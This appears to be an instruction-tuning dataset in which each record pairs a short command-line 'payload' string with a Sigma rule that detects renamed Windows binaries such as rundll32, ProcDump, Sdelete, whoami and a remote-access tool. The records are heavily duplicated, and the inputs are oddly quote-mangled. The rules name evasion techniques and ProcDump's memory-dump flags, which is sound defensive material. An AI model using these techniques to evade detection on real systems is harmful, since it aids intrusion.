{"instruction": "Write Sigma rule to detect payload:", "input": "Microsoft.NodejsTools.PressAnyKey.exe \\Microsoft.NodejsTools.PressAnyKey.exe", "output": "title: Visual Studio NodejsTools PressAnyKey Renamed Execution\nid: 65c3ca2c-525f-4ced-968e-246a713d164f\nrelated:\n    - id: a20391f8-76fb-437b-abc0-dba2df1952c6\n      type: similar\nstatus: test\ndescription: Detects renamed execution of \"Microsoft.NodejsTools.PressAnyKey.exe\", which can be abused as a LOLBIN to execute arbitrary binaries\nreferences:\n    - https://twitter.com/mrd0x/status/1463526834918854661\n    - https://gist.github.com/nasbench/a989ce64cefa8081bd50cf6ad8c491b5\nauthor: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)\ndate: 2023-04-11\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'Microsoft.NodejsTools.PressAnyKey.exe'\n    filter_main_legit_name:\n        Image|endswith: '\\Microsoft.NodejsTools.PressAnyKey.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DllRegisterServer \\rundll32.exe", "output": "title: Potential Renamed Rundll32 Execution\nid: 2569ed8c-1147-498a-9b8c-2ad3656b10ed\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: derived\nstatus: test\ndescription: Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\nreferences:\n    - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20\n    - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-03\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'DllRegisterServer'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DllRegisterServer \\\"\\rundll32.exe\\\"", "output": "title: Potential Renamed Rundll32 Execution\nid: 2569ed8c-1147-498a-9b8c-2ad3656b10ed\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: derived\nstatus: test\ndescription: Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\nreferences:\n    - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20\n    - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-03\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'DllRegisterServer'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DllRegisterServer \\rundll32", "output": "title: Potential Renamed Rundll32 Execution\nid: 2569ed8c-1147-498a-9b8c-2ad3656b10ed\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: derived\nstatus: test\ndescription: Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\nreferences:\n    - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20\n    - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-03\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'DllRegisterServer'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "DllRegisterServer \\rundll32.exe", "output": "title: Potential Renamed Rundll32 Execution\nid: 2569ed8c-1147-498a-9b8c-2ad3656b10ed\nrelated:\n    - id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n      type: derived\nstatus: test\ndescription: Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection\nreferences:\n    - https://twitter.com/swisscom_csirt/status/1331634525722521602?s=20\n    - https://app.any.run/tasks/f74c5157-8508-4ac6-9805-d63fe7b0d399/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-22\nmodified: 2023-02-03\ntags:\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'DllRegisterServer'\n    filter:\n        Image|endswith: '\\rundll32.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rutserv.exe \\rfusclient.exe", "output": "title: Renamed Remote Utilities RAT (RURAT) Execution\nid: 9ef27c24-4903-4192-881a-3adde7ff92a5\nstatus: test\ndescription: Detects execution of renamed Remote Utilities (RURAT) via Product PE header field\nreferences:\n    - https://redcanary.com/blog/misbehaving-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-19\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.collection\n    - attack.command-and-control\n    - attack.discovery\n    - attack.s0592\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\rutserv.exe\" \\rfusclient.exe", "output": "title: Renamed Remote Utilities RAT (RURAT) Execution\nid: 9ef27c24-4903-4192-881a-3adde7ff92a5\nstatus: test\ndescription: Detects execution of renamed Remote Utilities (RURAT) via Product PE header field\nreferences:\n    - https://redcanary.com/blog/misbehaving-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-19\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.collection\n    - attack.command-and-control\n    - attack.discovery\n    - attack.s0592\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rutserv \\rfusclient", "output": "title: Renamed Remote Utilities RAT (RURAT) Execution\nid: 9ef27c24-4903-4192-881a-3adde7ff92a5\nstatus: test\ndescription: Detects execution of renamed Remote Utilities (RURAT) via Product PE header field\nreferences:\n    - https://redcanary.com/blog/misbehaving-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-19\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.collection\n    - attack.command-and-control\n    - attack.discovery\n    - attack.s0592\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rutserv.exe \\rfusclient.exe", "output": "title: Renamed Remote Utilities RAT (RURAT) Execution\nid: 9ef27c24-4903-4192-881a-3adde7ff92a5\nstatus: test\ndescription: Detects execution of renamed Remote Utilities (RURAT) via Product PE header field\nreferences:\n    - https://redcanary.com/blog/misbehaving-rats/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-19\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.collection\n    - attack.command-and-control\n    - attack.discovery\n    - attack.s0592\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Remote Utilities'\n    filter:\n        Image|endswith:\n            - '\\rutserv.exe'\n            - '\\rfusclient.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Dbgview.exe \\Dbgview.exe", "output": "title: Renamed SysInternals DebugView Execution\nid: cd764533-2e07-40d6-a718-cfeec7f2da7f\nstatus: test\ndescription: Detects suspicious renamed SysInternals DebugView execution\nreferences:\n    - https://www.epicturla.com/blog/sysinturla\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-05-28\nmodified: 2023-02-14\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Sysinternals DebugView'\n    filter:\n        OriginalFileName: 'Dbgview.exe'\n        Image|endswith: '\\Dbgview.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Dbgview.exe \\\"\\Dbgvi\\\"ew.exe", "output": "title: Renamed SysInternals DebugView Execution\nid: cd764533-2e07-40d6-a718-cfeec7f2da7f\nstatus: test\ndescription: Detects suspicious renamed SysInternals DebugView execution\nreferences:\n    - https://www.epicturla.com/blog/sysinturla\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-05-28\nmodified: 2023-02-14\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Sysinternals DebugView'\n    filter:\n        OriginalFileName: 'Dbgview.exe'\n        Image|endswith: '\\Dbgview.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Dbgview \\Dbgview", "output": "title: Renamed SysInternals DebugView Execution\nid: cd764533-2e07-40d6-a718-cfeec7f2da7f\nstatus: test\ndescription: Detects suspicious renamed SysInternals DebugView execution\nreferences:\n    - https://www.epicturla.com/blog/sysinturla\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-05-28\nmodified: 2023-02-14\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Sysinternals DebugView'\n    filter:\n        OriginalFileName: 'Dbgview.exe'\n        Image|endswith: '\\Dbgview.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Dbgview.exe \\Dbgview.exe", "output": "title: Renamed SysInternals DebugView Execution\nid: cd764533-2e07-40d6-a718-cfeec7f2da7f\nstatus: test\ndescription: Detects suspicious renamed SysInternals DebugView execution\nreferences:\n    - https://www.epicturla.com/blog/sysinturla\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-05-28\nmodified: 2023-02-14\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Product: 'Sysinternals DebugView'\n    filter:\n        OriginalFileName: 'Dbgview.exe'\n        Image|endswith: '\\Dbgview.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "procdump -ma -mp /accepteula \\procdump.exe \\procdump64.exe", "output": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "procdump -ma -mp /accepteula \\procdump.exe \\\"\\procdu\\\"mp64.exe", "output": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "procdump -M -mp /accepteula \\procdump.exe \\procdump64.exe", "output": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "procdump -ma -mp /accepteula \\procdump \\procdump64", "output": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "procdump -ma -mp /accepteula \\procdump.exe \\procdump64.exe", "output": "title: Renamed ProcDump Execution\nid: 4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67\nrelated:\n    - id: 03795938-1387-481b-9f4c-3f6241e604fe\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of a renamed ProcDump executable.\n    This often done by attackers or malware in order to evade defensive mechanisms.\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-11-18\nmodified: 2024-06-25\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_ofn:\n        OriginalFileName: 'procdump'\n    selection_cli_dump_flag:\n        CommandLine|contains|windash:\n            - ' -ma ' # Full Dump\n            - ' -mp ' # Mini Plus\n    selection_cli_eula_flag:\n        # Note: Even though the \"accepteula\" flag isn't required. We add it to avoid collision with similar utilities.\n        CommandLine|contains|windash: ' /accepteula'\n    filter_main_known_names:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: (selection_ofn or all of selection_cli_*) and not 1 of filter_main_*\nfalsepositives:\n    - Procdump illegally bundled with legitimate software.\n    - Administrators who rename binaries (should be investigated).\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdelete.exe \\sdelete.exe \\sdelete64.exe", "output": "title: Renamed Sysinternals Sdelete Execution\nid: c1d867fe-8d95-4487-aab4-e53f2d339f90\nstatus: test\ndescription: Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-02-03\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'sdelete.exe'\n    filter:\n        Image|endswith:\n            - '\\sdelete.exe'\n            - '\\sdelete64.exe'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdelete.exe \"\\sdelete.exe\" \"\\sdelete64.exe\"", "output": "title: Renamed Sysinternals Sdelete Execution\nid: c1d867fe-8d95-4487-aab4-e53f2d339f90\nstatus: test\ndescription: Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-02-03\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'sdelete.exe'\n    filter:\n        Image|endswith:\n            - '\\sdelete.exe'\n            - '\\sdelete64.exe'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdelete \\sdelete \\sdelete64", "output": "title: Renamed Sysinternals Sdelete Execution\nid: c1d867fe-8d95-4487-aab4-e53f2d339f90\nstatus: test\ndescription: Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-02-03\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'sdelete.exe'\n    filter:\n        Image|endswith:\n            - '\\sdelete.exe'\n            - '\\sdelete64.exe'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "sdelete.exe \\sdelete64.exe \\sdelete.exe", "output": "title: Renamed Sysinternals Sdelete Execution\nid: c1d867fe-8d95-4487-aab4-e53f2d339f90\nstatus: test\ndescription: Detects the use of a renamed SysInternals Sdelete, which is something an administrator shouldn't do (the renaming)\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/sdelete\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-09-06\nmodified: 2023-02-03\ntags:\n    - attack.impact\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'sdelete.exe'\n    filter:\n        Image|endswith:\n            - '\\sdelete.exe'\n            - '\\sdelete64.exe'\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator usage\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "vmnat.exe vmnat.exe", "output": "title: Renamed Vmnat.exe Execution\nid: 7b4f794b-590a-4ad4-ba18-7964a2832205\nstatus: test\ndescription: Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\nreferences:\n    - https://twitter.com/malmoeb/status/1525901219247845376\nauthor: elhoim\ndate: 2022-09-09\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'vmnat.exe'\n    filter_rename:\n        Image|endswith: 'vmnat.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "vmnat.exe vmna\\\"t.exe\\\"", "output": "title: Renamed Vmnat.exe Execution\nid: 7b4f794b-590a-4ad4-ba18-7964a2832205\nstatus: test\ndescription: Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\nreferences:\n    - https://twitter.com/malmoeb/status/1525901219247845376\nauthor: elhoim\ndate: 2022-09-09\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'vmnat.exe'\n    filter_rename:\n        Image|endswith: 'vmnat.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "vmnat vmnat", "output": "title: Renamed Vmnat.exe Execution\nid: 7b4f794b-590a-4ad4-ba18-7964a2832205\nstatus: test\ndescription: Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\nreferences:\n    - https://twitter.com/malmoeb/status/1525901219247845376\nauthor: elhoim\ndate: 2022-09-09\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'vmnat.exe'\n    filter_rename:\n        Image|endswith: 'vmnat.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "vmnat.exe vmnat.exe", "output": "title: Renamed Vmnat.exe Execution\nid: 7b4f794b-590a-4ad4-ba18-7964a2832205\nstatus: test\ndescription: Detects renamed vmnat.exe or portable version that can be used for DLL side-loading\nreferences:\n    - https://twitter.com/malmoeb/status/1525901219247845376\nauthor: elhoim\ndate: 2022-09-09\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1574.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'vmnat.exe'\n    filter_rename:\n        Image|endswith: 'vmnat.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\whoami.exe", "output": "title: Renamed Whoami Execution\nid: f1086bf7-a0c4-4a37-9102-01e573caf4a0\nstatus: test\ndescription: Detects the execution of whoami that has been renamed to a different name to avoid detection\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-12\nmodified: 2022-10-09\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'whoami.exe'\n    filter:\n        Image|endswith: '\\whoami.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\\"\\whoa\\\"mi.exe", "output": "title: Renamed Whoami Execution\nid: f1086bf7-a0c4-4a37-9102-01e573caf4a0\nstatus: test\ndescription: Detects the execution of whoami that has been renamed to a different name to avoid detection\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-12\nmodified: 2022-10-09\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'whoami.exe'\n    filter:\n        Image|endswith: '\\whoami.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami \\whoami", "output": "title: Renamed Whoami Execution\nid: f1086bf7-a0c4-4a37-9102-01e573caf4a0\nstatus: test\ndescription: Detects the execution of whoami that has been renamed to a different name to avoid detection\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-12\nmodified: 2022-10-09\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'whoami.exe'\n    filter:\n        Image|endswith: '\\whoami.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\whoami.exe", "output": "title: Renamed Whoami Execution\nid: f1086bf7-a0c4-4a37-9102-01e573caf4a0\nstatus: test\ndescription: Detects the execution of whoami that has been renamed to a different name to avoid detection\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-12\nmodified: 2022-10-09\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName: 'whoami.exe'\n    filter:\n        Image|endswith: '\\whoami.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: critical"}
